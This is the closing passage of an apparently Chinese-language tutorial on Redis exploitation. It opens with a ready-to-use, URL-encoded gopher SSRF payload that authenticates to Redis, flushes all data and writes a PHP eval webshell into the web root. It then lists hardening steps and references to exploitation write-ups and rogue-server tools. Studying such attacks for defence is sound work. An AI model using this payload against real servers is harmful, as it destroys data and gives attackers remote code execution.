gopher://127.0.0.1:6379/_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25248%250D%250Adengfeng%250D%250A%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250Ax%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522qftm%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252414%250D%250A/var/www/html/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25248%250D%250Atest.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A
```
- 带认证的攻击效果
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016fd9fb99a82e025f.png)



## 防护
- 升级redis至最新版
<li>开启保护模式`protected-mode yes`
</li>
- 绑定本地`127.0.0.1`地址
<li>设置强密码认证`requirepass xxxxxxxxxxxxxxxxxxxxxxxx`
</li>
- 替换部分具有恶意的指令


## 总结

关于`redis`的探索到这里也告一段落了，相关技术基本上都进行了涵盖，以及新思路(技术)的不断尝试、探索与发现，希望大家也能够在已有的技术上有所发现。

漏洞姿势万千，技术需要不断的探索，这个过程难免遇到各种问题，只有敢于探索才能成长。



## References
- [redis-documentation](https://redis.io/documentation)
- [redis-commands](https://redis.io/commands)
- [redis-tutorial](https://www.runoob.com/redis/redis-tutorial.html)
- [Redis 4.0: Redis Modules 模块](https://zhuanlan.zhihu.com/p/44685035)
- [Redis主从复制的原理](https://www.jianshu.com/p/4aa9591c3153)
- [Redis复制实现原理](https://www.cnblogs.com/hongmoshui/p/10594639.html)
- [15-redis-post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
- [Redis 基于主从复制的 RCE 利用方式](https://paper.seebug.org/975/)
- [redis-rogue-server](https://github.com/LoRexxar/redis-rogue-server)
- [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
- [Spring Data Redis &lt;=2.1.0反序列化漏洞](https://xz.aliyun.com/t/2339)
- [细数 redis 的几种 getshell 方法](https://paper.seebug.org/1169)
- [掌阅iReader某站Python漏洞挖掘](https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html)
- [Redis漏洞利用与防御](https://www.freebuf.com/column/170710.html)
- [对一次 redis 未授权写入攻击的分析以及 redis 4.x RCE 学习](https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/)
- [Redis 多维度角度下的攻击面](https://blog.csdn.net/qq_38154820/article/details/106330102)
- [浅析SSRF认证攻击Redis](https://www.anquanke.com/post/id/181599)
- [利用 Gopher 协议拓展攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/)
- [redis安全学习小记](https://mp.weixin.qq.com/s/W9joCtUQfNA62ZWXwqMmsw)
- [redis数据库在渗透中的利用](https://xz.aliyun.com/t/8018)